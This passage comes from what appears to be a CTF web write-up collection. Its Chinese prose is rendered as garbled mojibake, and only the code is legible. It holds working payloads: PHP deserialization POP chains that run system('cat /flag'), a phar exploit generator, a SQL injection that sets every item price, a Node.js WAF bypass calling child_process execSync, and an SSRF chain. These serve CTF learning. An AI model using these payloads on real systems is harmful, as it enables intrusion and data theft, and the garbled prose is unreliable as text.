ï¼Œé‡ç‚¹è”åŠ¨çš„å°±æ˜¯ä¸Šä¼ æ–‡ä»¶å’ŒæŸ¥çœ‹æ–‡ä»¶äº†ï¼Œä¸€èˆ¬æœ‰è¿™ä¿©åŠŸèƒ½çš„ç«™ç‚¹ï¼Œå¤§æ¦‚ç‡å°±ä¼šæœ‰pharååºåˆ—åŒ–å§ã€‚ æŸ¥çœ‹æ–‡ä»¶é‡Œé¢æ²¡å•¥è¯´çš„ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨class.phpé‡Œé¢çš„ç±»æ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªæ³¨æ„çš„å°±æ˜¯function.phpé‡Œé¢å¯¹äºä¸Šä¼ çš„æ–‡ä»¶çš„å¤„ç†ï¼šåœ¨è¿™é‡Œé¦–å…ˆé™åˆ¶äº†æ–‡ä»¶ååç¼€ï¼ˆä¸”ä»…æœ‰è¿™ç§é™åˆ¶ï¼‰ï¼Œåªä¿®è¦ä¿®æ”¹åç¼€å³å¯ï¼Œæ²¡å•¥è¯´çš„ã€‚ åé¢å¯¹äºæ–‡ä»¶çš„å¤„ç†ï¼Œåˆ™æ˜¯å…ˆå–å‡ºå®Œæ•´çš„æ–‡ä»¶åç§°ï¼Œä¾‹å¦‚exp.phpç»è¿‡$_FILES[\"file\"][\"name\"]å¤„ç†åä¾ç„¶æ˜¯exp.phpä¹‹åï¼Œæ‹¼æ¥æˆ‘ä»¬çš„ipåœ°å€ï¼Œä¹Ÿå°±æ˜¯åœ¨é¡µé¢å³ä¸Šè§’å¤„ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ ä¹‹åç»è¿‡md5çš„åŠ å¯†ç»„æˆæ–‡ä»¶å+jpgçš„æ–¹å¼ï¼Œæœ€åå°±æ˜¯md5(æ‹¼æ¥å­—ç¬¦ä¸²).jpgï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æœ€åè®¿é—®çš„æ–‡ä»¶åã€‚ æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹classçš„ååºåˆ—åŒ–é“¾å­çš„åˆ†æäº†ï¼šè¿™é‡Œä¸éš¾åˆ†æï¼Œä¸»è¦å…ˆå®šä½åˆ°å¼•èµ·pharååºåˆ—åŒ–çš„ç‚¹file_get_contentså‡½æ•°ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ€åè¯»å–flagçš„å‡½æ•°ã€‚ è¿›ä¸€æ­¥åˆ†æä¸éš¾å‘ç°è¿™ä¸ªé“¾å­ï¼šC1e4r.__destruct-ã€‹Show.__toString-ã€‹Test.__get-ã€‹Test.get-ã€‹Test.file_getï¼Œæœ€åpopå¦‚ä¸‹ &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $phar = new Phar(\"exp.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //è®¾ç½®stub $pop = new C1e4r(); $pop-&gt;str = new Show(); $pop-&gt;str-&gt;str = array(\"str\"=&gt;new Test()); $pop-&gt;str-&gt;str['str']-&gt;params = array(\"source\"=&gt;'/var/www/html/f1ag.php'); $phar-&gt;setMetadata($pop); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; è¿™é‡Œæˆ‘ä¹Ÿé™·å…¥äº†ä¸€ä¸ªè¯¯åŒºå°±æ˜¯å¯¹äºè°ƒç”¨_geté­”æœ¯æ–¹æ³•çš„ç†è§£ã€‚æˆ‘ä»¥ä¸º$this-&gt;str['str']-&gt;sourceè¿™ä¸€æ­¥çš„è°ƒç”¨ï¼Œæ˜¯å°†sourceçš„å‚æ•°å€¼èµ‹å€¼ç»™äº†geté­”æœ¯æ–¹æ³•çš„å‚æ•°keyï¼Œæ²¡æƒ³åˆ°çœ‹äº†PHPæ‰‹å†Œå‘ç°æ˜¯ç›´æ¥å°†sourceå‚æ•°åç§°å¤åˆ¶ç»™äº†keyï¼Œè¿™æ‰æœ‰äº†åç»­çš„array(\"source\"=&gt;'/var/www/html/f1ag.php')çš„äº§ç”Ÿã€‚ æœ€åç”Ÿæˆçš„pharæ–‡ä»¶ï¼Œä¿®æ”¹åç¼€å³å¯ï¼Œæœ€åfileå‚æ•°è®¿é—®å³å¯å¾—åˆ°flag [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]UnS3rialize &lt;?php highlight_file(__FILE__); error_reporting(0); class NSS { public $cmd; function __invoke() { echo \"Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;\"; system($this-&gt;cmd); } function __wakeup() { echo \"W4keup!!!&lt;br/&gt;\"; $this-&gt;cmd = \"echo Welcome to NSSCTF\"; } } class C { public $whoami; function __get($argv) { echo \"what do you want?\"; $want = $this-&gt;whoami; return $want(); } } class T { public $sth; function __toString() { echo \"Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger\"; return $this-&gt;sth-&gt;var; } } class F { public $user = \"nss\"; public $passwd = \"ctf\"; public $notes; function __construct($user, $passwd) { $this-&gt;user = $user; $this-&gt;passwd = $passwd; } function __destruct() { if ($this-&gt;user === \"SWPU\" &amp;&amp; $this-&gt;passwd === \"NSS\") { echo \"Now you know how to use __construct&lt;br/&gt;\"; echo \"your notes\".$this-&gt;notes; }else{ die(\"N0!\"); } } } if (isset($_GET['ser'])) { $ser = unserialize(base64_decode($_GET['ser'])); } else { echo \"Let's do some deserialization :)\"; } Let's do some deserialization :) è¿™é“é¢˜ï¼Œé“¾å­ç®€å•ï¼Œå°±æ˜¯ç»•è¿‡wakeupå°±è¡Œäº†ï¼Œä¹Ÿæ˜¯è€åŠæ³•ï¼Œé“¾å­å¦‚ä¸‹ &lt;?php class NSS { public $cmd; } class C { public $whoami; } class T { public $sth; } class F { public $user = \"SWPU\"; public $passwd = \"NSS\"; public $notes; } $pop = new F(); $pop-&gt;notes = new T(); $pop-&gt;notes-&gt;sth = new C(); $pop-&gt;notes-&gt;sth-&gt;whoami = new NSS(); $pop-&gt;notes-&gt;sth-&gt;whoami-&gt;cmd = \"cat /flag\"; echo serialize($pop).\" \"; $pop1 = str_replace('\"F\":3','\"F\":4',serialize($pop)); echo base64_encode($pop1); ?&gt; ä¿®æ”¹å±æ€§æ•°é‡å³å¯ [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]ez_talk è¿™é‡Œé¦–å…ˆç›´æ¥ä¸Šä¼ äº†phpæ–‡ä»¶ï¼Œç»“æœåœ¨ä¿®æ”¹mimeï¼Œåç¼€ï¼Œæ–‡ä»¶å¤´ï¼Œéƒ½ä¸è¡Œã€‚ä¸”ç»™çš„æç¤ºå§‹ç»ˆå¦‚ä¸€ï¼Œæ‰€ä»¥æˆ‘ä¸Šä¼ äº†æ­£å¸¸çš„æ–‡ä»¶ï¼Œä¹‹åå‘ç°æ ¹æœ¬ä¸æ£€æµ‹åç¼€ã€‚ äºæ˜¯å°è¯•åœ¨æ­£å¸¸å›¾ç‰‡åŠ è½½phpä¸€å¥è¯æœ¨é©¬ï¼Œä½†ä¾æ—§è¢«banï¼ŒåŸå› å¦‚ä¸‹å›¾ä½¿ç”¨äº†getimagesizeå‡½æ•°æ¥æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚ å› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶åbpæŠ“åŒ…ä¿®æ”¹åç¼€ï¼Œè®¿é—®å¯¹åº”æ–‡ä»¶ï¼›å¦‚ä¸‹å›¾ï¼Œä»”ç»†è§‚å¯Ÿå°±çŸ¥é“ï¼Œä¸Šä¼ ç›®å½•ä»–åè½¬äº†è€Œå·²ï¼Œæ­£å¸¸è®¿é—®å³å¯ [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]NSSå¤§å–åœº è¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡è§updateæ³¨å…¥ï¼Œè„‘å­é‡Œæ ¹æœ¬æ²¡æœ‰è¿™ç§æƒ³æ³•ï¼Œä¹Ÿæ˜¯çœ‹äº†wpæ‰è‡ªæˆ‘è®¤ä¸ºæƒ³é€šäº† é¦–å…ˆæ˜¯å¯¹é¡µé¢å¸¸è§„æµ‹è¯•äº†ä¸€ç•ªï¼Œä¹Ÿæ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œé™¤äº†ä¸€ä¸ªæ˜æ˜¾çš„hintï¼Œflagä¹°ä¸èµ·ã€‚ è™½ç„¶çœ‹äº†é¢˜ç›®æ ‡ç­¾å†™ç€updateæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘è™½ç„¶æ‰¾åˆ°äº†æ³¨å…¥ç‚¹ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•ä¸‹æ‰‹ï¼Œç®—æ˜¯å¢é•¿ç»éªŒäº†ã€‚ é¦–å…ˆçœ‹hintï¼Œç»™äº†ä¸€ä¸ªæ•°æ®åº“å¤‡ä»½æ–‡ä»¶ è¿™é‡Œå½“æ—¶åˆ†æçš„æ—¶å€™ï¼Œä¹Ÿæ²¡æœ‰åˆ†æå‡ºä»€ä¹ˆï¼Œçœ‹äº†wpæ‰çŸ¥é“è‡ªå·±æ˜¯æ²¡æœ‰åˆ†æçš„æ€è·¯ï¼ˆå°±æ˜¯ä¸ä¼šåˆ†æï¼‰ã€‚ ç°åœ¨å›è¿‡å¤´æ¥å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œé¢å«æœ‰itemsè¡¨ï¼Œè€Œå…¶ä¸­å«æœ‰å„ç§åˆ—åï¼Œä½†å€¼å¾—æ³¨æ„çš„å°±æ˜¯priceä»·æ ¼è¡¨ï¼Œè¿™ä¹Ÿä¼¼ä¹æˆäº†åé¢ä¸ºä½•æƒ³åˆ°updateæ³¨å…¥çš„å…³é”®äº†ã€‚ è¿™é‡Œä¼šæƒ³åˆ°é€šè¿‡updateæ¥æ›´æ”¹itemsçš„priceä¸º1ï¼Œè¿™æ ·å°±ä¹°çš„èµ·äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾æ³¨å…¥ç‚¹äº†ï¼Œå¯ä»¥æƒ³åˆ°ä¹°å•†å“çš„åœ°æ–¹å¾ˆå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ã€‚è¿™é‡Œå°è¯•äº†ä¸€ç•ªï¼Œç›´æ¥åœ¨urlåé¢åŠ äº†ä¸ªå•å¼•å·ï¼Œäºæ˜¯çˆ†å‡ºsqlé”™è¯¯ï¼Œæ¥ç€è¿›è¡Œæ¶æ„è¯­å¥çš„å†™å…¥ï¼Œå‘ç°è¿‡æ»¤äº†å¦‚ä¸‹å…³é”®å­— SELECT|select|UPDATE|update|WHERE|where| |or|AND|and|ORDER|order|BY|by|--|&lt;|&gt;|! ä½†å¾ˆæ˜æ˜¾å¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œpayloadå¦‚ä¸‹ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºä½•å†…è”æ³¨é‡Šç¬¦ä¸èƒ½ä»£æ›¿ç©ºæ ¼ buy/1';Update%09items%09set%09price=1;#//è®¾ç½®itemsçš„priceå­—æ®µå…¨ä¸º1 æ›´æ–°æŸä¸€åˆ— UPDATE table SET column=new_value WHERE column= value æ›´æ–°è‹¥å¹²åˆ— UPDATE table SET column1=new_value1, column2=new_value2 WHEREcolumn= value ä¹‹åç›´æ¥ä¹°flagï¼ŒæŸ¥çœ‹å³å¯ [GFCTF 2021]ez_calc é¦–å…ˆæ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œè¿™é‡Œçœ‹F12å¾—åˆ°æç¤ºï¼Œé‡‡ç”¨nodejså¤„ç†ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åè½¬æ¢æˆå°å†™ä¸ç­‰äºadminä¸”è½¬æ¢ä¸ºå¤§å†™ç­‰äºADMINä¸”ç”¨æˆ·åç­‰äºadmin123å³å¯ç™»å½•ï¼Œè¿™é‡Œç¿»äº†ç¿»ç¬”è®°ï¼Œå‘ç°è¿™æ ·çš„ç‰¹æ€§ toUpperCase()æ˜¯javascriptä¸­å°†å°å†™è½¬æ¢æˆå¤§å†™çš„å‡½æ•°ã€‚ toLowerCase()æ˜¯javascriptä¸­å°†å¤§å†™è½¬æ¢æˆå°å†™çš„å‡½æ•° é™¤æ­¤ä¹‹å¤– åœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚ åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚ å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œé‡‡ç”¨ç‰¹æ®Šå­—ç¬¦å³å¯ã€‚ç™»é™†ä¹‹åå‘ç°æ˜¯ä¸ªè®¡ç®—å™¨ &lt;!-- let calc = req.body.calc; let flag = false; //waf for (let i = 0; i &lt; calc.length; i++) { if (flag || \"/(flc'\\\".\".split``.some(v =&gt; v == calc[i])) { //ç¦ç”¨(,'f','l','c',\"'\",'\"','.' è¿™äº›å­—ç¬¦ flag = true; calc = calc.slice(0, i) + \"*\" + calc.slice(i + 1, calc.length); } } //æˆªå– calc = calc.substring(0, 64); //å»ç©º calc = calc.replace(/\\s+/g, \"\"); calc = calc.replace(/\\\\/g, \"\\\\\\\\\");//å°†åæ–œæ æ›¿æ¢ä¸ºä¸¤ä¸ªåæ–œæ  //å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿ while (calc.indexOf(\"sh\") &gt; -1) { calc = calc.replace(\"sh\", \"\"); } while (calc.indexOf(\"ln\") &gt; -1) { calc = calc.replace(\"ln\", \"\"); } while (calc.indexOf(\"fs\") &gt; -1) { calc = calc.replace(\"fs\", \"\"); } while (calc.indexOf(\"x\") &gt; -1) { calc = calc.replace(\"x\", \"\"); } try { result = eval(calc); } --&gt; è¿™é‡Œä¸»è¦å°±æ˜¯ç»•è¿‡ç¬¬ä¸€ä¸ªifæ¡ä»¶è¯­å¥çš„é™åˆ¶ï¼Œé¦–å…ˆä»–ä¼šæ£€æŸ¥ä¼ å…¥çš„calcå­—ç¬¦ä¸²çš„æ¯ä¸€ä½å­—ç¬¦æ˜¯å¦ä¸ºé»‘åå•ä¸­çš„å­—ç¬¦ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è¿‡æ»¤æ‰ã€‚è¿™é‡Œé™åˆ¶çš„å¾ˆæ­»ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡è§ï¼Œåªèƒ½çœ‹wpäº†ï¼Œå‘ç°åˆ©ç”¨çš„æ˜¯æ•°ç»„ç»•è¿‡ã€‚ åŸç†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹å†…å®¹ï¼š[\"aaaaa\",\"bbbbb\",ccccc]ï¼Œé‚£ä¹ˆè¯¥é•¿åº¦å°±æ˜¯3äº†ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦äº†ã€‚ è¿™é‡Œä¼¼ä¹ä»–åœ¨æ£€æŸ¥çš„æ—¶å€™ï¼Œå°±åªä¼šæŠŠç¬¬ä¸€ä¸ªå…ƒç´ å½“åšæ•´ä½“äº†ï¼Œå³ä½¿å…¶ä¸­åŒ…å«é»‘åå•å­—ç¬¦ï¼Œä¹Ÿä¸ä¼šè¿›è¡Œè¿‡æ»¤äº†ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·çš„ï¼š[\"a)aaa\",\"bbbbb\",\"(\",]åœ¨ç»è¿‡è¿‡æ»¤ä¹‹åä¼šå˜æˆa)a********ï¼Œå› ä¸ºä»–æ˜¯åœ¨ç¬¬ä¸‰ä¸ªä¸ºå‘ç°äº†æ•æ„Ÿå­—ç¬¦ã€‚äºæ˜¯æŒ‰ç…§é€»è¾‘ï¼Œä¼šå°†ç¬¬ä¸‰ä½ä»¥åå¾—å†…å®¹éƒ½è¿›è¡Œæ›¿æ¢ã€‚è¿™æ ·æˆ‘ä»¬ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ•æ„Ÿå­—ç¬¦å°±é€ƒé€¸äº†ã€‚ è¯¦ç»†è§£é‡Šå¯ä»¥å‚è€ƒï¼šä¸€é“Node.jsç±»å‹æ··æ·†æ±¡æŸ“ä¸å­—ç¬¦é€ƒé€¸å®ç°SQLæ³¨å…¥çš„é¢˜ç›®åˆ†æ è‡³äºä¸ºä»€ä¹ˆä¸€å®šè¦åœ¨æœ€åæä¸€ä¸ªæ•æ„Ÿå­—ç¬¦ï¼Œé‚£æ˜¯å› ä¸ºå¦‚æœéƒ½æ˜¯æ­£å¸¸çš„è¯ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ï¼Œä½†å¦‚æœå«æœ‰æ•æ„Ÿå­—ç¬¦ï¼Œé‚£å‰é¢çš„payloadå°±å¯ä»¥æ‰§è¡Œ è¿™æ ·çš„è¯ï¼Œå¯ä»¥æŒ‰ç…§é€»è¾‘è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼šæˆ‘ä»¬æƒ³è¦æ„é€ payloadæœ‰å¤šé•¿ï¼Œåé¢çš„æ•°ç»„å°±éœ€è¦å¤šå°‘ calc[]=require(\"child_process\").spawnSync('ls',['/']).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. è¿™é‡Œä¸åŠ stdout.toString()å°±æ²¡å›æ˜¾ æ¥ä¸‹æ¥å°±æ˜¯è¯»å–äº†ï¼Œå› ä¸ºflagçš„åå­—å¾ˆé•¿ï¼Œä¼šè¶…è¿‡é•¿åº¦é™åˆ¶ï¼Œå› æ­¤è¿™é‡Œåˆéœ€è¦å¯¹ä»£ç çš„ç†è§£äº†ï¼ˆGFCTF_is_girlfriend_ctf.flagï¼‰ è¿™é‡Œè¿‡æ»¤äº†xï¼Œä¹Ÿæ— æ³•ç›´æ¥åˆ©ç”¨execï¼Œä½†æ˜¯å®é™…ä¸Šè¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡requireå¯¼å…¥çš„æ¨¡å—æ˜¯ä¸€ä¸ªObjectï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡Object.valuesè·å–åˆ°child_processé‡Œé¢çš„å„ç§æ–¹æ³•ï¼Œé‚£ä¹ˆå†é€šè¿‡æ•°ç»„ä¸‹æ ‡[5]å°±å¯ä»¥å¾—åˆ°execSyncäº†ï¼Œé‚£ä¹ˆæœ‰äº†execSyncåå°±å¯ä»¥é€šè¿‡å†™å…¥æ–‡ä»¶çš„æ–¹å¼è¯»å–flagäº†ï¼Œpayloadå¦‚ä¸‹: calc[]=Object.values(require('child_process'))[5]('cat${IFS}/G*&gt;p')&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. æ‰§è¡Œä¹‹åç›´æ¥è¯»å–pè¯•è¯•ã€‚ calc[]=require('child_process').spawnSync('nl',['p']).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. å‚è€ƒæ–‡ç«  WPç¯‡ä¹‹è§£æ2021 GFCTFä¸­çš„ä¸¤é“Web [SWPUCTF 2022 æ–°ç”Ÿèµ›]Power! çœ‹åˆ°hintè¯´ç»™sourceä¼ å‚ï¼ŒçŒœæµ‹æ˜¯æŸ¥çœ‹æ–‡ä»¶ã€‚ index.php &lt;?php class FileViewer{ public $black_list = \"flag\"; public $local = \"http://127.0.0.1/\"; public $path; public function __call($f,$a){ $this-&gt;loadfile(); } public function loadfile(){ if(!is_array($this-&gt;path)){ if(preg_match(\"/\".$this-&gt;black_list.\"/i\",$this-&gt;path)){ $file = $this-&gt;curl($this-&gt;local.\"cheems.jpg\"); }else{ $file = $this-&gt;curl($this-&gt;local.$this-&gt;path); } }else{ $file = $this-&gt;curl($this-&gt;local.\"cheems.jpg\"); } echo '&lt;img src=\"data:jpg;base64,'.base64_encode($file).'\"/&gt;'; } public function curl($path){ $url = $path; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 0); $response = curl_exec($curl); curl_close($curl); return $response; } public function __wakeup(){ $this-&gt;local = \"http://127.0.0.1/\"; } } class Backdoor{ public $a; public $b; public $superhacker = \"hacker.jpg\"; public function goodman($i,$j){ $i-&gt;$j = $this-&gt;superhacker; } public function __destruct(){ $this-&gt;goodman($this-&gt;a,$this-&gt;b); $this-&gt;a-&gt;c(); } } if(isset($_GET['source'])){ highlight_file(__FILE__); }else{ if(isset($_GET['image_path'])){ $path = $_GET['image_path']; //flag in /flag.php if(is_string($path)&amp;&amp;!preg_match(\"/http:|gopher:|glob:|php:/i\",$path)){ echo '&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents($path)).'\"/&gt;'; }else{ echo '&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents(\"cheems.jpg\")).'\"/&gt;'; } }else if(isset($_GET['path_info'])){ $path_info = $_GET['path_info']; $FV = unserialize(base64_decode($path_info)); $FV-&gt;loadfile(); }else{ $path = \"vergil.jpg\"; echo '&lt;h2&gt;POWER!!&lt;/h2&gt; &lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents($path)).'\"/&gt;'; } } ?&gt; æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹flag.phpé‡Œé¢æœ‰ä»€ä¹ˆï¼Œç»™image_pathä¼ å‚å³å¯ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œè¯´flagåœ¨65500ç«¯å£å¤„ &lt;?php $a = \"good job,but there is no flag i put my flag in intranet(127.0.0.1:65500) outsider have no permissions to get it if you want it,then you have to take it but you already knew the rules try it\"; ?&gt; æ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­ï¼Œä¸éš¾æ‰¾åˆ°Backdoor.__destruct-ã€‹FileViewer.__call-ã€‹FileViewer.loadfile-ã€‹FileViewer::curl() é“¾å­è™½ç„¶ä¸éš¾æ‰¾ï¼Œä½†æ˜¯æˆ‘å´åˆé™·å…¥äº†è¯¯åŒºï¼Œä¸ä¼šåšï¼Œé¦–å…ˆå…ˆçœ‹ä¸‹é¢çš„ç‚¹ï¼ˆåˆ«çš„å¸ˆå‚…å¼ºè°ƒçš„ï¼‰ å½“æˆ‘ä»¬çš„ååºåˆ—åŒ–æ­£åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåŒæ—¶æ‰§è¡Œ $FV-&gt;loadfile();è¿™ä¸ªè¯­å¥ï¼Œä½†æ˜¯$FVæ˜¯Backdoorçš„å¯¹è±¡ï¼Œæ ¹æœ¬æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚é‚£ä¹ˆå°±è¦è®©$FVæ˜¯FileViewerçš„å¯¹è±¡ã€‚ æŒ‰ç…§æˆ‘ä»¬è®¾æƒ³ï¼Œæœ¬æ¥æ˜¯æƒ³backdooråŒ…å«fileviewerç±»çš„ï¼Œä½†æ˜¯æŒ‰ç…§ä¸Šè¿°çš„tipï¼Œå¿…é¡»fileviwerç±»åŒ…å«backdooræ‰è¡Œã€‚ ç„¶åé—®äº†GPTå‘ç°ååºåˆ—åŒ–é¡ºåºæ˜¯å…ˆååºåˆ—åŒ–å¤–éƒ¨ç±»ï¼Œåååºåˆ—åŒ–å†…éƒ¨ç±»ã€‚è¿™æ ·çš„è¯å°±è¯´é€šäº†ï¼šå…ˆä¸Šé“¾å­ &lt;?php class FileViewer{ public $black_list; public $local; public $path = \"flag\"; } class Backdoor{ public $a; public $b; public $superhacker; public function __construct(){ $this-&gt;a = new FileViewer(); $this-&gt;b = \"local\"; $this-&gt;superhacker = \"http://127.0.0.1:65500/\"; } } $a = new Backdoor(); $b = new FileViewer(); $b-&gt;local = $a; echo base64_encode(serialize($b)); é¦–å…ˆå¤–éƒ¨ç±»ä¸ºFileViewerï¼Œå› æ­¤ååºåˆ—åŒ–çš„æ—¶å€™ä¼šé¦–å…ˆè°ƒç”¨FileViewerç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œå¯¼è‡´localå‚æ•°å†…å®¹è¢«ä¿®æ”¹ã€‚ä½†æˆ‘ä»¬æ³¨æ„åˆ°backdoorç±»ä¸­çš„goodmanå¯ä»¥ä¿®æ”¹ç±»çš„å±æ€§ï¼Œé‚£å°±å¯ä»¥å°†backdoorç±»ä¸­çš„aå‚æ•°èµ‹å€¼ä¸ºFileViewerï¼Œbèµ‹å€¼ä¸ºlocalï¼Œ$superhackerèµ‹å€¼ä¸ºhttp://127.0.0.1:65500/ï¼Œè¿™æ ·ç»è¿‡goodmançš„è¯å°±æ˜¯ï¼š FileViewer-&gt;local = http://127.0.0.1:65500ï¼Œè¾¾åˆ°æ•ˆæœã€‚è€Œè¿™é‡Œæˆ‘ä»¬éœ€è¦è®©backdoorç±»è¢«åŒ…å«ï¼Œé‚£çœ‹äº†çœ‹å‚æ•°åªæœ‰localå¯ä»¥ä½¿ç”¨ï¼Œæˆ‘ä»¬ä»¤localä¸ºbackdoorç±»å¯¹è±¡ï¼Œè¿™æ 